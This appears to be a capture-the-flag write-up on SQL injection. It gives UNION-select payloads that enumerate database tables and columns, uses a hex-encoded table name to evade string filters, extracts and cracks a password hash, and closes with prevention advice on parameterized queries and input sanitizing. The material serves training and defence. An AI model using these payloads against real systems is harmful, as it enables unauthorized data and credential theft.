# Vulnerability

Get all the tables name on the Database :
```
1 and 1=0 union select null,table_name from information_schema.tables limit 41,4
```

Get the fields available of the user table :
`0x7573657273` is basically `user` but since we can't use strings we put it in hex form
```
1 and 1=0 union select null,column_name from information_schema.columns where table_name=0x7573657273
```

Get the flag :
```
1 and 1=0 union select Commentaire,countersign from users limit 3,1
```

`5ff9d0165b4f92b14994e5c685cdce28` -> FortyTwo 
`echo -n "fortytwo" | shasum -a 256` -> got the flag

# Exploit

- Extract sensitive information, like Social Security numbers, or credit card details.
- Enumerate the authentication details of users registered on a website, so these logins can be used in attacks on other sites.
- Delete data or drop tables, corrupting the database, and making the website unusable.
- Inject further malicious code to be executed when users visit the site.

# Protection

- You should always use parameterized statements where available, they are your number one protection against SQL injection.
- Using ORM (object relationnal mapping) because they use parametrized statements even though they can let you construct the sql statement
- WARNING: if you find yourself writing SQL statements by concatenating strings, think very carefully about what you are doing!
- Escaping inputs: escape all special characters and still be careful (not all rely on abuse of characters)
- Sanitize input: Check that supplied fields like email addresses match a regular expression, ensure that numeric or alphanumeric fields do not contain symbol characters, reject (or strip) out whitespace and new line characters where they are not appropriate

# Source

https://www.hacksplaining.com/prevention/sql-injection
